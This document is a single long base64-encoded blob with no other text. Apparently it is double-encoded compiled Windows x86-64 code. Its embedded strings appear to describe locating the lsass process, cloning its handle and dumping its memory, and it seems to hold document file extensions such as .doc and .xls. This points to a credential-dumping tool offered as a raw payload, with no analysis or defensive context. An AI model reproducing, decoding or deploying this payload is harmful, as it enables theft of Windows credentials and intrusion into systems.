KTkFBQUFEb1p3c0FBSXVFSk9BQkFBQk1pZW5IaENTa0FBQUFCd0FBQUlQQVVJbUVKT0FCQUFDSmhDU3NBQUFBLzVhd0FBQUF1bXdBQUFCSXVHNTBaR3hzTG1Sc3VYSnpBQUJJaVlRa2pBQUFBRWk0VW5Sc1IyVjBUblJtaVpRa2xBQUFBRWk2Vm1WeWMybHZiazVJaVlRa3NBQUFBRWlOaENTTUFBQUFTSW1VSkxnQUFBQm1pWXdreEFBQUFFaUp3Y2VFSk1BQUFBQjFiV0pseG9Ra3hnQUFBQUJJaVVRa1VQK1dxQUFBQUV5SjRrbUp4a2lKd2YrVzBBQUFBRWlKK2tpSmZDUm9USTJFSklnQUFBQk1pVVFrTUVpTmpDU0FBQUFBLzlCTWlmRkZNZmFCcENTSUFBQUEvLzhBQVArV3VBQUFBQSszaENUd0FBQUF4b1FrSndFQUFBSEhoQ1EwQVFBQUFnQUFBR2FKaENRZ0FRQUFpNFFrSEFFQUFNZUVKRHdCQUFBUUFBQUFpWVFrSWdFQUFJdUVKQkFCQUFCSXg0UWtRQUVBQUFBQUFBQ0loQ1FtQVFBQWk0UWtnQUFBQUVqSGhDUklBUUFBQUFBQUFJbUVKQ2dCQUFDTGhDU0VBQUFBaVlRa0xBRUFBSXVFSklnQUFBQ0poQ1F3QVFBQWk0UWs0QUVBQUlQQU9JbUVKRGdCQUFCRWlmSC9sc0FBQUFDRndIUVJTSW5ZUklueFNOUGdTQW1FSkVBQkFBQkJnOFlCUVlQK1FIWFlpNVFrNEFFQUFFVXh5VVV4d0VpSjcwaUxqQ1RZQVFBQVNJMWNKSGovbHFBQUFBQklpWFFrSUVtSjZVaU5oQ1FnQVFBQVNJdU1KTmdCQUFCSWljSkJ1RGdBQUFCSWlVUWtRT2hxQ1FBQU1jQzVRQUFBQUlPRUpPQUJBQUE0ODBpclNJbnAvNWJJQUFBQVNJbDBKQ0JJalZRa2ZFaUxqQ1RZQVFBQUFjQkppZGxCdUFRQUFBQ0pSQ1I4NkNrSkFBQklpWFFrSUVtSjJVaUo2a1NMUkNSOFNJdU1KTmdCQUFEb0RBa0FBSXRFSkh4Rk1jbEZNY0FEaENUZ0FRQUFpNVFrM0FBQUFNZUVKS2dBQUFBNEFBQUFnOEFFU0l1TUpOZ0JBQUNKaENUZ0FRQUEvNWFnQUFBQVNJbDBKQ0JKaWVsSWpZUWtwQUFBQUVpTGpDVFlBUUFBU0luQ1FiZ01BQUFBU0lsRUpFam9wZ2dBQUl1RUpPQUJBQUNMakNUSUFRQUF4NFFrcEFBQUFBUUFBQUNKUkNSZ2lZUWtyQUFBQUlYSkQ0UlVDQUFBZytrQlNJdVVKTUFCQUFCSWFja29BZ0FBU0luUVRJMkVDaWdDQUFBeHlROGZBSU00QVlQUkFFZ0ZLQUlBQUV3NXdIWHZhOGxzUlRIMlRJbGtKRmhNamJ3a0ZBSUFBTWVFSklRQUFBQUFBQUFBUlluMGpVRUVpMHdrWUluSGlVUWtaSW5JQWZoSWpid2tPQUVBQUltRUpPQUJBQUNOUVFTSlJDUTg2dzBQSDBRQUFFaUxsQ1RBQVFBQVJJbmpTR25iS0FJQUFFaU5EQnFMQVlYQUQ0VWhBZ0FBU0lQQkhQK1d5QUFBQUVpTGxDVEFBUUFBVEluNWpVUUFBa2dCMm9tRUpCQUNBQUJJZzhJYy81WUFBUUFBaTVRazRBRUFBRVV4eVVVeHdFZ0RuQ1RBQVFBQVNJdU1KTmdCQUFCSWkwTUlTSW1FSkNBQkFBQ0xReENKaENRb0FRQUFpME1ZaVlRa0xBRUFBSXRERkl1Y0pCQUNBQUNKbENRMEFRQUFpWVFrTUFFQUFJMUQvb1BEQkltRUpCQUNBQUQvbHFBQUFBQkJpZGhOaWVsSWllcElpWFFrSUVpTGpDVFlBUUFBNkNnSEFBQUJuQ1RnQVFBQVRJbjVTSXRVSkRESGhDU3dBQUFBWEFBQUFFakhCd0FBQUFCSXgwY0lBQUFBQUVqSFJ4QUFBQUFBU01kSEdBQUFBQUJJeDBjZ0FBQUFBRWpIUnlnQUFBQUF4MGN3QUFBQUFQK1c2QUFBQUluRGhjQVBoSklBQUFCTWk3YUFBQUFBLzVhSUFBQUFRWW5ZTWRKSWljRkIvOVpKaWNaSWhjQjBjb3VVSklnQUFBQkppY0ZCaWRoTWlmbi9sdkFBQUFDRndIUkJUSXRNSkZCSWkxUWtXRTJKNkV5SjhmK1crQUFBQUlYQWRDZUR2Q1NNQUFBQU5FRzROQUFBQUVpTGxDVHdBQUFBU0luNVJBOUdoQ1NNQUFBQVJZbkEveFpJaTU2UUFBQUEvNWFJQUFBQVRZbndNZEpJaWNILzA0dUVKSVFBQUFDTFRDUThSVEhKUlRIQVNNZUVKR3dCQUFBQUFBQUFTTWVFSkhRQkFBQUFBQUFBalZBQmE4QnNpWlFraEFBQUFFakhoQ1I4QVFBQUFBQUFBRWpIaENTRUFRQUFBQUFBQUkwVUNFaUxqQ1RZQVFBQS81YWdBQUFBU0lsMEpDQklpMVFrUUUySjZVaUxqQ1RZQVFBQVFiaHNBQUFBNkxjRkFBQkJnOFFCUkR1a0pNZ0JBQUFQZ3EzOS8vOU1pMlFrV0l0VUpHQkZNY2xGTWNBeDIwaUxqQ1RZQVFBQS81YWdBQUFBU0lsMEpDQklpMVFrYUUySjZVaUxqQ1RZQVFBQVFiZ0VBQUFBNkdZRkFBQ0xSQ1JrUlRISlJUSEFTSXVNSk5nQkFBQ0poQ1NvQUFBQWk0UWszQUFBQUkxUURQK1dvQUFBQUVpSmRDUWdTSXRVSkVoSmllbElpNHdrMkFFQUFFRzREQUFBQU9nZEJRQUE2eGNQSHdCTUFmTVBndk1BQUFCSWk1d2tFQUlBQUV3QjgwaUxqQ1NnQVFBQVFia3dBQUFBU1lub1NJbmEvNWJZQUFBQVNJWEFENFRGQUFBQWdid2tNQUlBQUFBUUFBQk1pN1FrS0FJQUFIVzBUSXU4SlBnQkFBQklpN3drRUFJQUFFMkYvdytFT2dRQUFJdUVKQUFDQUFDTGxDUUVBZ0FBT2RBUGdod0VBQUJNaTVhWUFBQUFBZEtKbENRRUFnQUFpVlFrUEV5SlZDUXcvNWFJQUFBQVJJdE1KRHhOaWZneDBreUxWQ1F3U0luQlNjSGhCRUgvMGttSngwaUpoQ1Q0QVFBQVRZWC9ENFFTQkFBQWk0UWtBQUlBQUVpTGpDUW9BZ0FBaWNLRHdBRkl3ZUlFU1FIWFRZbDNDRW1Kemt3QjgwbUpQNG1FSkFBQ0FBQVBndzMvLy8rTGhDUUFBZ0FBaTVRazRBRUFBRVV4eVVVeHdNZUVKS1FBQUFBSkFBQUFqVWdCU0ltRUpQQUFBQUNKejRtVUpLd0FBQUJJaTR3azJBRUFBTUhuQkkwRU9vbDhKR0JJaVlRaytBQUFBUCtXb0FBQUFFaUpkQ1FnVElucVNZbnBTSXVNSk5nQkFBQkJ1QWdBQUFCRk1lM29xQU1BQUl1RUpPQUJBQUJGTWNsRk1jQklpNHdrMkFFQUFJMVFDSW1VSk9BQkFBRC9scUFBQUFCSWlYUWtJRW1KNlVpTGpDVFlBUUFBU0kyVUpQZ0FBQUJCdUFnQUFBRG9ZQU1BQUl1RUpPQUJBQUNOZUFpTGhDUUFBZ0FBaVh3a1BFR0p4a0hCNWdSQkFmNUVpYlFrNEFFQUFJWEFENFNnQVFBQVJJbHNKREJJaTN3a1VBOGZnQUFBQUFCRWkzd2tNRVV4eVVVeHdFVXg3VWlMaENUNEFRQUFTSXVNSk5nQkFBQkp3ZWNFVEFINFNJc1FTSXRBQ0VpSmxDUWdBUUFBVElueVNJbUVKQ2dCQUFEL2x1QUFBQUJJaTRRaytBRUFBRXdCK0VpTFdBaEloZHQxSnVuU0FBQUFacEJJaTRRaytBRUFBRW1CeFFBRUFBQk1BZmhJaTFnSVREbnJENGF4QUFBQVNZblpSQ25yVFNucFNZSDUvd01BQUhZTFFia0FCQUFBdXdBRUFBQklpeEJNaVdRa0lFbUo2RWlMakNTZ0FRQUFTTWVFSkxBQUFBQUFBQUFBVEFIcTZEM3ovLytGd0hXWlNJbDBKQ0JKaWZsQmlkaElpZXBJaTR3azJBRUFBT2crQWdBQTZYbi8vLzltRHgrRUFBQUFBQUJJQWNJNVNsQVBoTUgxLy8rTEFvWEFkZTVJaTc2UUFBQUEvNWFJQUFBQVNZbllNZEpJaWNILzF6SEFTSUhFR0FZQUFGdGVYMTFCWEVGZFFWNUJYOE9RaTF3a1BFaUxqQ1RZQVFBQVJUSEpSVEhBVEFPMEpDZ0JBQUNKMm9QREVQK1dvQUFBQUVpSmRDUWdTSXRVSkVCTmllRklpNHdrMkFFQUFFRzRFQUFBQU9pckFRQUFnMFFrTUFHTFJDUXdpVndrUER1RUpBQUNBQUFQZ25IKy8vK0xSQ1JnU0l1TUpOZ0JBQUJGTWNsRk1jQ0poQ1NvQUFBQWk0UWszQUFBQUkxUUdQK1dvQUFBQUVpSmRDUWdTSXRVSkVoSmllbElpNHdrMkFFQUFFRzREQUFBQU9oSUFRQUFpNFFrM0FBQUFFVXh5VVV4d0VpTGpDVFlBUUFBalZBay81YWdBQUFBU0lsMEpDQklpNHdrMkFFQUFFbUo2VWlObENTWUFBQUFRYmdNQUFBQTZBY0JBQUJJaTd3azZBRUFBRWlMbnBBQUFBRC9sb2dBQUFBeDBrbUorRWlKd2YvVFNJdThKUGdCQUFCSWk1NlFBQUFBLzVhSUFBQUFNZEpKaWZoSWljSC8wMGlMdkNUQUFRQUFTSXVla0FBQUFQK1dpQUFBQURIU1NZbjRTSW5CLzlOSWk3d2tzQUVBQUVpTG5wQUFBQUQvbG9nQUFBQXgwa2lKd1VtSitQL1R1QUVBQUFEcGZQNy8vMHlKOGVrMy9QLy9USXUrZ0FBQUFNZUVKQVFDQUFBZ0FBQUEvNWFJQUFBQVFiZ0FBZ0FBTWRKSWljRkIvOWRKaWNkSWlZUWsrQUVBQUUyRi93K0Y3dnYvLzBqSGhDUUFBZ0FBQUFBQUFFeUx0Q1FvQWdBQTZRNzcvLytMUkNSZ3gwUWtaQVFBQUFESGhDU0VBQUFBQUFBQUFJUEFCSW1FSk9BQkFBRHBZUHIvLzBGV1RZbk9RVlZKaWMxQlZGVlhTSW5YVmxORWljTklnK3d3VEl1a0pKQUFBQUJKaTdRa2dBQUFBRUgvbENTSUFBQUFNZEpKaWRoSWljSC8xa2lGd0ErRWd3QUFBRWlKM1VpSnhvWGJkQzB4d0E4ZmdBQUFBQUFQdGhRSGlCUUdTSVBBQVVnNXczWHdTSW53U0FIelpwQ0FNRUZJZzhBQlNEbkRkZlJCaWVoSWlmSk1pZWxOaWZGSXgwUWtJQUFBQUFCQi8xUWtlRW1MbkNTUUFBQUFRZitVSklnQUFBQklnOFF3U1lud01kSklpY0ZJaWRoYlhsOWRRVnhCWFVGZS8rQVBINEFBQUFBQVNJUEVNRnRlWDExQlhFRmRRVjdEa0pDUWtKQ1FrSkNRUVZjeHdFRldRVlZCVkZWWFZraUp6cmtlQUFBQVUwaUI3RmdIQUFCSWpid2tRQUVBQUV5SmhDU3dCd0FBODBpcnVSNEFBQUJJeDBRa1lBQUFBQUJJeDBRa2FBQUFBQURIaENTd0FBQUFNQUFBQUVqSGhDUzRBQUFBQUFBQUFNZUVKTWdBQUFBQUFBQUFTTWVFSk1BQUFBQUFBQUFBeHdjQUFBQUFTSTI4SkZBQ0FBRHpTS3RJdUZBQWNnQnZBR01BU01lRUpOQUFBQUFBQUFBQVNJbUVKSUFBQUFCSXVHVUFjd0J6QUFBQVNJbUVKSWdBQUFDNGN3QUFBRWpIaENUWUFBQUFBQUFBQUVqSFJDUndBQUFBQUVqSFJDUjRBQUFBQUVqSGhDUXdBUUFBQUFBQUFFakhoQ1E0QVFBQUFBQUFBRWpIaENSQUFnQUFBQUFBQUVqSGhDUklBZ0FBQUFBQUFNY0hBQUFBQU1kRUpGcHNjMkZ6Wm9sRUpGNkxEb1hKRDRTVkF3QUFpZFZOaWN3eDIwVXgvMFV4OXVzT0R4OEFnOE1CT1I0UGhqMERBQUNKMzRYdGRBcElqUVIvT1d6R0NIWGxTSTBFZjR0RXhoZzlBQUFRQUErVndUMkpBUklBRDVYQ2hORjB5U1gvLy9mL1BaOEJFZ0IwdlUyRjluUVFRYmdBZ0FBQU1kSk1pZkZCLzFRa09FaU5CSDlJalV3a2FMcEFCQUFBU01kRUpIZ0FBQUFBVEkwc3hreU5UQ1J3UVl0RkNFeU5oQ1N3QUFBQVNJbEVKSERvUE9mLy8wRVB0MVVPeDBRa01BQUFBQUJNalV3a1lNZEVKQ2dBQUFBQVNJdE1KR2hKeDhELy8vLy94MFFrSUJBRUFBRG9QZVQvLzBHNUJBQUFBRUc0QUJBQUFESEp1Z0FRQUFCQi8xUWtTRW1KeGtpRndBK0VHLy8vLzBpTFRDUmdRYmtBRUFBQVNZbkF1Z0lBQUFCSXgwUWtJQUFBQUFEbzl1ci8vNFhBRDRqeS92Ly9TWXRPQ0VpTmxDU0FBQUFBUWY5VUpGQ0Z3QStGMmY3Ly8waU52Q1F3QVFBQU1kSklpMHdrWUVHNUJBRUFBRW1KK0VIL1ZDUmdoY0FQaExUKy8vOUlqWVFrUUFJQUFFaUxUQ1JvUWJnRUFRQUFTSWxFSkVoSWljSkIvMVFrYUlYQUQ0U00vdi8vU0kxVUpGcElpZmxCLzFRa1dFaUZ3QStFZHY3Ly8wSDNSUmdRQkFBQUQ0Um8vdi8vU0l0TUpFaElqYndrWUFNQUFFeU52Q1JRQlFBQVFmOVVKSEM1UGdBQUFFeUxSQ1J3U0xwa0lHRnVaQ0J6ZFVtSndVaTRXeXRkSUVadmRXNUlpWlFrNkFBQUFFaTZiSGtnWTJ4dmJtVklpWVFrNEFBQUFFaTRZMk5sYzNObWRXeElpWVFrOEFBQUFFaTRaQ0JvWVc1a2JHVklpWVFrQUFFQUFFaTRJR3h6WVhOeklHbElpWVFrRUFFQUFFaTRDVnNyWFNCSVlXNUlpWVFra0FBQUFFaTRkSE02SUNWNENnQklpWVFrb0FBQUFESEE4MGlyU0ltVUpQZ0FBQUJJamJ3a1lBVUFBRWk2SUNnbFpDa2dkRys1UGdBQUFFaUpsQ1FJQVFBQVNMcHVPaUFsY3lBb0pmTklxMGlKbENRWUFRQUFTSTI4SkZBREFBQkl1bVJzWlNCU2FXZG9TSW1VSkpnQUFBQklpZmxJalpRazRBQUFBRXlKUkNRZ3g0UWtJQUVBQUdRcENnQkl4NFFrVUFNQUFBQUFBQUJJeDRRa1dBTUFBQUFBQUFCSXg0UWtVQVVBQUFBQUFBQkl4NFFrV0FVQUFBQUFBQUJCLzFRa0dFV0xSUmhNaWZsSWpaUWtrQUFBQUVIL1ZDUVlTSXVNSkxBSEFBQklpZnBCLzFRa0NFeUora2lMakNTd0J3QUFRZjlVSkFoTWkzd2tZSVh0ZFZsTWlmbUR3d0ZCLzFRa0tEa2VENGZKL1AvL1pnOGZSQUFBU0l0TUpHaEloY2wwQlVIL1ZDUW9UWVgyZEJCQnVBQ0FBQUF4MGt5SjhVSC9WQ1E0U0lIRVdBY0FBRXlKK0Z0ZVgxMUJYRUZkUVY1Qlg4TkZNZi9yNUVpTFRDUm9TSVhKZGNEcnlKQ1FrSkJCVjBtSjEwRldUWW5HUVZWQmljMU1pY2xCVkZOTWljdElnZXl3QUFBQTZPd0xBQUJJaGNBUGhGTUJBQUJFaWVwSmlkbE5pZmhJaWNGSmljVG83L3IvLzBtSnhVaUZ3QStFa3dJQUFFaTRXeXBkSUU1dmR5Qk1pZm5HUkNSaUFFaTZkSEo1YVc1bklIUklpVVFrUUVpNGJ5QmtkVzF3SUd4SWlWUWtTRWk2YzJGemN5QXVMaTVJaVVRa1VMZ2dDZ0FBU0lsVUpGaElqVlFrUUdhSlJDUmcvMU1JVElueFJUSEpSVEhBU01kRUpEQUFBQUFBdWdBQUFFREhSQ1FvZ0FBQUFNZEVKQ0FDQUFBQS8xTWdTWW5HU0lQNC93K0VGZ0VBQUV5SjZmOVRNRW1KMlUySjhFeUo2WW5DNkxEci8vK0Z3QStFZUFFQUFFaTRXeXRkSUV4ellYTk1pZmxJdW5NZ1pIVnRjQ0JweDRRa2lBQUFBSFJsQ2dCSWlVUWtjRUcvQVFBQUFFaTRjeUJqYjIxd2JHVklpVlFrZUVpTlZDUndTSW1FSklBQUFBRC9Vd2hOaGZaMEJreUo4ZjlUS0V5SjZmOVRLRUc0QUlBQUFESFNUSW5oLzFNNFNJSEVzQUFBQUVTSitGdEJYRUZkUVY1Qlg4Tm1EeCtFQUFBQUFBQkl1RnN0WFNCR1lXbHNUSW41U0xwbFpDQjBieUJuWmNlRUpKQUFBQUJzWlhNS1NJbEVKSEJGTWY5SXVIUWdZU0JzYVhOMFNJbFVKSGhJdWlCdlppQm9ZVzVrU0ltVUpJZ0FBQUJJalZRa2NFaUpoQ1NBQUFBQXhvUWtsQUFBQUFEL1V3anBlLy8vL3c4ZmhBQUFBQUFBU0xoYkxWMGdRMjkxYkV5SitVaTZaQ0J1YjNRZ2QzTEhoQ1NZQUFBQWFXeGxDa2lKUkNSd1JUSC9TTGhwZEdVZ2RHOGdjMGlKVkNSNFNMcHdaV05wWm1sbFpFaUpoQ1NBQUFBQVNMZ2diM1YwY0hWMFpraUpsQ1NJQUFBQVNJMVVKSEJJaVlRa2tBQUFBTWFFSkp3QUFBQUEvMU1JNmQvKy8vOW1EeDlFQUFCSXVGc3RYU0JUYjIxbFRJbjVSVEgvU0xwMGFHbHVaeUIzWlVpSlJDUndTTGh1ZENCM2NtOXVaMGlKVkNSNFNMb2dkMmhwYkdVZ1pFaUpoQ1NBQUFBQVNMaDFiWEJwYm1jS0FFaUpsQ1NJQUFBQVNJMVVKSEJJaVlRa2tBQUFBUDlUQ09sdC92Ly9aZzhmaEFBQUFBQUFTTGhiTFYwZ1EyOTFiRXlKK1VpNlpDQnViM1FnWm1uSGhDU2dBQUFBYVdRS0FFaUpSQ1J3UlRIL1NMaHVaQ0JoY0hCeWIwaUpWQ1I0U0xwd2NtbGhkR1VnYUVpSmhDU0FBQUFBU0xoaGJtUnNaU0JwYmtpSmxDU0lBQUFBU0xvZ1oybDJaVzRnY0VpSmxDU1lBQUFBU0kxVUpIQklpWVFra0FBQUFQOVRDT254L2YvL2tKQ1FrSkNRa0pDUWtKQ1FRVmU0cUJVQUFFRldRVlZCVkZWWFZsUG9hdHovLzBHNEFCQUFBRWdweEVtSnpESEF1UUFDQUFCSWpid2tvQVVBQUVpTm5DU2dBUUFBU0luVlNNZEVKSEFBQUFBQTgwaXJ1VUFBQUFCSWlkOU1qYlFrb0FNQUFQTklxMHlKOTdsQUFBQUFTSTIwSktBRkFBRHpTS3RNalV3a1pFaUo4a21MVENRUVNNZEVKSGdBQUFBQVNNZUVKSUFBQUFBQUFBQUF4MFFrWkFBQUFBRC9sUkFCQUFDTFJDUmtTSTJNSkpBQUFBQklpVXdrT01Ib0E0bEVKR1FQaElJQkFBQk1qWHdrY0RIL1RJbjRUWW4zU1luR0R4OUFBRW1MVENRUVNJc1dRYmtZQUFBQVRZbncvNVVZQVFBQWhjQVBoRDRCQUFCSmkwd2tFRWlMRmtHNUFBRUFBRW1KMlArVklBRUFBSVhBRDRRZkFRQUFTTGd1QUhNQWJ3QUFBRWlKMmNlRUpKZ0FBQUErQUFBQVNJbEVKR2hJdUR3QVpRQnNBR1lBU0ltRUpKQUFBQUQvbGNnQUFBQkltRXlOREVOSmpWSCtTRG5hY3gvcHZnSUFBR1lQSDRRQUFBQUFBSVA0TDNRVVNJMUMva2c1MkhJUFNJbkNEN2NDZy9oY2RlZElnOElDU1NuUnVmOEFBQUJCdVA4QUFBQk5pYzFNaVV3a0tFblIvVW1CK2Y4QkFBQk1EMGZwVEluNVM0MUVMUUJJaVVRa1FFd0IrRWlKUkNRdy8xVUFTSXRFSkRCTWkwd2tLREhKWm9rSVNZUDVDQStIaGdBQUFFbUQrUVlQaDVVQUFBQk1pZnJyQ3c4ZmdBQUFBQUJJZzhJQ0Q3Y0NSSTFBdjQxSUlHWkJnL2dhRDBMQlpva0Nab1hBZGVKTWkyd2tjSXRFSkhoSmkwd2tFRXlMUkNRNFRJbnFpVVFrS09nTERRQUFoY0FQaFpNQUFBQ0R4d0ZJZzhZSU9Yd2taQStIa3Y3Ly8waUJ4S2dWQUFCYlhsOWRRVnhCWFVGZVFWL0RaZzhmUkFBQVNZbm9USW5xVEluNTZOb0pBQUJJbUVpRndBK0ZQd0VBQUVpTFJDUkFTSTFVSkdoSmpVd0grditWS0FFQUFJWEFENFZPLy8vL1NZMVYvVW1KNkV5SitlaWpDUUFBU0poSWhjQVBoRFQvLy85SktjVklpMVFrT0V1TlRHLzYvNVVBQVFBQTZSei8vLytMaENUb0FBQUFUWXRFSkRDSlJDUXdpNFFrbUFBQUFJbEVKRUJOaGNBUGhPUUFBQUJCaTBRa09FR0xWQ1E4T2RCeVZVeUxuWmdBQUFBQjBreUpSQ1JZUVlsVUpEeUpWQ1JVVElsY0pFai9sWWdBQUFDTFZDUlVUSXRFSkZoTWkxd2tTRWlKd1V4cHlpZ0NBQUF4MGtILzAwbUp3RW1KUkNRd1RZWEFENFRGQUFBQVFZdEVKRGhJYWNBb0FnQUFTWXRNSkJCTWllcEJ1UVFCQUFCTmpVUUFIUCtWQ0FFQUFFR0xSQ1E0aTB3a0tFaUp3a2hwd0NnQ0FBQkpBMFFrTUlsSUVJdE1KRUNEd2dGTWlXZ0lpVWdVaTB3a01NY0FBQUFBQUlsSUdFR0pWQ1E0NlliKy8vOW1EeCtFQUFBQUFBQkpLY1V4MG1aQ2laUnNvQU1BQU9rWi92Ly9EeDlFQUFCQngwUWtQQ0FBQUFCTWk0MkFBQUFBVElsTUpFai9sWWdBQUFCQnVBQkZBQUJNaTB3a1NESFNTSW5CUWYvUlNZbkFTWWxFSkRCTmhjQVBoVHYvLy85SngwUWtPQUFBQUFEcEdQNy8vMEc0L3dBQUFFeUp5a3lKK2Y5VkFESEFab21FSktBREFBRHBxZjMvLzVDUWtKQ1FrSkNRa0pDUWtKQkJWYnA4WWZST1FWUkppY3k1WTlkUDVsZElnZXhRQWdBQTZJSUNBQUJJaGNBUGhIc0JBQUJKaWNDNExnQUFBRWlOZkNSQXVSNEFBQUJtaVVRa0xqSEFRUSsyRkNUelNLdTVIZ0FBQUVqSFJDUXdBQUFBQUVqSFJDUTRBQUFBQUVqSGhDUkFBUUFBQUFBQUFFakhoQ1JJQVFBQUFBQUFBTWNIQUFBQUFFaU52Q1JRQVFBQTgwaXJ4d2NBQUFBQWhOSjBHbVlQSDBRQUFBKzJ5RWlEd0FHSVZBd3dRUSsyRkFTRTBuWHNUSTFrSkRCSWpWUWtMa3lKNFVILzBFbUp3RWlGd0ErRTJnQUFBQSsyVUFIR0FBQ0UwZytFQ1FFQUFESEFEeCtBQUFBQUFBKzJ5RWlEd0FHSWxBeEFBUUFBUVErMlZBQUJoTkoxNkErMmhDUkFBUUFBaE1BUGhOZ0FBQUJNallRa1FRRUFBTGtGRlFBQUR4OEFpY3BKZzhBQndlSUZBZEFCd1VFUHRrRC9oTUIxNm9IeFJFTkNRVUdKelErMlJDUXdoTUFQaEtjQUFBQk1qVVFrTWJrRkZRQUFacENKeWttRHdBSEI0Z1VCMEFIQlFRKzJRUCtFd0hYcWdmRkVRMEpCNkk4QUFBQklpY0ZJaGNCMEYwU0o2dWl2Q0FBQVNJSEVVQUlBQUY5QlhFRmR3MmFRdVRHdEFqSG9aZ0FBQUVpSndVaUZ3SFVXTWNCSWdjUlFBZ0FBWDBGY1FWM0REeCtBQUFBQUFMcS9zLzBlNkc0SUFBQkloY0IwMjB5SjRmL1FTSW5CU0lYQWRhVXh3T3ZNRHgrRUFBQUFBQUJCdlVGV1FrSHBUUC8vLzdsQlZrSkI2WGYvLy8rUWtKQ1FrSkNRa0pDUWtHVklpd1FsWUFBQUFFaUxRQmlCOFVSRFFrRkJpY3BNaTFnZ1RZblpEeDhBU1l0SlVFaUZ5WFJqRDdjQlpvWEFkRjlJaWNvUEgwQUFSSTFBdjJaQmcvZ1pkd2FEd0NCbWlRSVB0MElDU0lQQ0FtYUZ3SFhpRDdjQlpvWEFkREpCdUFVVkFBQVBIMEFBUkluQ1NJUEJBc0hpQlFIUVFRSEFEN2NCWm9YQWRlbEZPY0owRjAyTENVMDV5M1dVTWNERGtFRzRCUlVBQUVVNXduWHBTWXRCSU1OQlZFR0oxRk9KeTBpRDdGam9ULy8vLzBpRndIVWl1VEd0QWpIb1FQLy8vMGlKd1VpRndIVW9TSVBFV0RIQVcwRmN3MllQSDBRQUFFaUR4RmhFaWVKSWljRmJRVnpwUmdjQUFHWVBIMFFBQUxxL3MvMGU2RFlIQUFCSWhjQjB5WUg3bCt4Ym1BK0VoUUFBQUlIN0RjbGlKZytFNlFBQUFJSDdZOWRQNWcrRXRRQUFBSUg3aUNiNEFBK0VBUUVBQUlIN3V3N085WFdSU0xwQmNHa3RiWE10ZDhaRUpFSUFTTGxwYmkxamIzSmxMVWlKVkNRZ1NMcDJaWEp6YVc5dUxVaUpUQ1FvU0xsc01TMHhMVEF1WkVpSlZDUXd1bXhzQUFCSWlVd2tPRWlOVENRZ1pvbFVKRUQvMEVpSndlc3NacEJCdUd4c0FBQklqVXdrSU1aRUpDb0FTTHRWYzJWeU16SXVaRWlKWENRZ1prU0pSQ1FvLzlCSWljRkloY2tQaEFYLy8vOUlnOFJZUkluaVcwRmM2VjRHQUFCbUR4OUVBQUJJdTFOb2JIZGhjR2t1U0kxTUpDREhSQ1FvWkd4c0FFaUpYQ1FnLzlCSWljSHJ2dzhmUkFBQVNMdEJaSFpoY0drek1raU5UQ1FneGtRa0xBQklpVndrSU1kRUpDZ3VaR3hzLzlCSWljSHJrZzhmaEFBQUFBQUFTTHRRYzJGd2FTNWtiTGxzQUFBQVpvbE1KQ2hJalV3a0lFaUpYQ1FnLzlCSWljSHBZdi8vLzVDUWtKQ1FrSkNRUVZSRk1jQkZNZVJXVTBpSnkwaUQ3RERIUkNRc0FBQUFBRWlOZENRc1NZbnhUSW5pdVJBQUFBRG9qTjMvLzRYQWVRbzlCQUFBd0hRWFJUSGtTSVBFTUV5SjRGdGVRVnpERHgrRUFBQUFBQUJOaGVSMERrRzRBSUFBQURIU1RJbmgvMU00UWJnQUVBQUFpMVFrTEVHNUJBQUFBREhKLzFOSVJJdEVKQ3hKaWNUcm5KQ1FrSkNRa0pDUWtKQ1FrSkNRUVZkQlZrV0p4a0ZWVFluTlFWUlZNZTFYU0lub1Zvbk91U2NBQUFCVFNJblRTSUhzeUFVQUFFaU52Q1NBQUFBQVRJMjhKSUFBQUFEelNLdE1pZm5vN1FZQUFFR0p4SVhBZFI1SWdjVElCUUFBUkluZ1cxNWZYVUZjUVYxQlhrRmZ3dzhmZ0FBQUFBQk1pZm5vQUEwQUFFR0p4SVhBRDRRZEFnQUFoZllQaE1VQUFBQkl1RnNxWFNCRGFHVmpUSW5wU0xwcmFXNW5JR1p2Y3NhRUpBQUVBQUFBU0ltRUpNQURBQUJCdkFFQUFBQkl1Q0J3Y205alpYTnpTSW1VSk1nREFBQkl1bVZ6SUhkcGRHZ2dTSW1FSk5BREFBQkl1R0VnYzNWcGRHRmlTSW1VSk5nREFBQkl1bXhsSUdoaGJtUnNTSW1FSk9BREFBQkl1R1VnZEc4Z2JITmhTSW1VSk9nREFBQkl1bk56SUM0dUxpQUtTSW1VSlBnREFBQklqWlFrd0FNQUFFaUpoQ1R3QXdBQS81UWtpQUFBQUV5SitreUo2ZWhDQlFBQTZRZi8vLzhQSDBRQUFFaU52Q1RRQVFBQXVUNEFBQUJGaWZER1JDUnlBRWk0V3lwZElFRjBkR1ZJdW0xd2RHbHVaeUIwU01lRUpNQURBQUFBQUFBQVRJMmtKTUFEQUFCSWlVUWtRRWlOdENUQUFRQUFTTGh2SUdOc2IyNWxJRWlKUkNSUVNMaHVaR3hsSUdaeWIwaUpSQ1JndUdRS0FBQm1pVVFrY0VpNFd5cGRJRTkxZEdaSWlVUWtJRWlKNlBOSXEwaUpWQ1JJdVQ0QUFBQkl1bXh6WVhOeklHaGhTSTI4Sk5BREFBQklpVlFrV0VpNmJTQndhV1E2SUNWSXg0UWt5QU1BQUFBQUFBRHpTS3RJaWZGSWlWUWthRWk2YVd4bE9pQWxjd3BJaVZRa0tFaU5WQ1JBeGtRa01BQkl4NFFrd0FFQUFBQUFBQUJJeDRRa3lBRUFBQUFBQUFEL2xDU1lBQUFBU1luWVRJbmhTSTFVSkNEL2xDU1lBQUFBU0lueVRJbnAvNVFraUFBQUFFeUo0a3lKNlVHOEFRQUFBUCtVSklnQUFBQk5pZmxKaWRoTWllcEVpZkhvMVBELy8rbTUvZi8vRHgrQUFBQUFBRWk2WkNCdWIzUWdaVzVNaWVsSXVGc3RYU0JEYjNWc3g0UWs0QU1BQUd4bFoyVklpWlFreUFNQUFFaTZkV2NnY0hKcGRtbElpWVFrd0FNQUFFaTRZV0pzWlNCRVpXSklpWlFrMkFNQUFMb0tBQUFBWm9tVUpPUURBQUJJalpRa3dBTUFBRWlKaENUUUF3QUEvNVFraUFBQUFPazcvZi8va0VGVlJUSEpSVEhTU0xndUFHRUFZd0J0QUVGVVZWZElpYzh4eVZaSWlkWXgwbE5NaWNORk1jQklnZXlvQUFBQVNJbEVKQ1F4d0V5TlpDUWtTSTFzSkdCbWlVUWtMRWk0TGdCa0FHd0FiQUJJaVVRa0xraTRMZ0JrQUhJQWRnQklpVVFrT0VpNExnQmxBSGdBWlFCSWlVUWtRa2k0TGdCdkFHTUFlQUJJaVVRa1RFaTRMZ0IyQUhnQVpBQklpVVFrVmtpTlJDUXVTSWxFSkdoSWpVUWtPRWlKUkNSd